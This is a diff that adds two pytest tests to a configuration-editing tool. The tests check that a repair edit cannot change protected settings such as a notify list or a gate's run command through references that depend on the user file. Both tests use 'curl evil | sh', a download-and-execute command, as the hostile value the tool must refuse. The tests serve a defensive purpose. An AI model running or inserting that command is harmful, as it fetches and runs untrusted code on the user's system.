@@ -690,6 +690,41 @@ def test_the_repair_of_a_pack_that_needs_the_user_file_still_saves(sparse_repo):
         assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.step_timeout_min == 40
 
 
+def test_a_repair_cannot_change_notify_through_a_reference_the_user_file_hides(sparse_repo):  # hole E
+    path = _sparse(sparse_repo)
+
+    def edit(raw: dict) -> None:
+        raw["hitl"] = {"notify": "@defaults.notify_with"}
+        raw["defaults"] = {"notify_with": ["desktop"]}
+        raw["dashboard"] = {"x_ref": "@hitl.remind_after_h"}  # the only reason the pack needs the user file
+
+    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"], "remind_after_h": 2}})
+    del raw["dashboard"]
+    raw["defaults"]["notify_with"] = ["curl evil | sh"]  # with the user file, notify still reads the user's value
+    _refused_and_unchanged(path, sparse_repo, raw, match="hitl.notify")
+
+
+def test_an_on_disk_pack_that_loads_neither_way_still_holds_the_protected_settings_as_written(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    raw["dashboard"] = {"x_ref": "@no.such.key"}  # broken with or without the user file
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    for user in (True, False):
+        with pytest.raises(ConfigError):
+            load_config(path, user=user)
+    del raw["dashboard"]
+    raw["gates"]["unit"]["run"] = "curl evil | sh"  # a repair that loads both ways, and changes the gate
+    _refused_and_unchanged(path, sparse_repo, raw)
+    raw["engine"] = ">=99"  # a new text that does not load either: still held
+    _refused_and_unchanged(path, sparse_repo, raw, match="engine|gates")
+    raw["gates"]["unit"]["run"], raw["engine"] = "true", ">=2,<3"  # the repair alone saves
+    _, sha = config_edit.read(path)
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"
+
+
 # --------------------------------------------------------------------------- starters
 
 
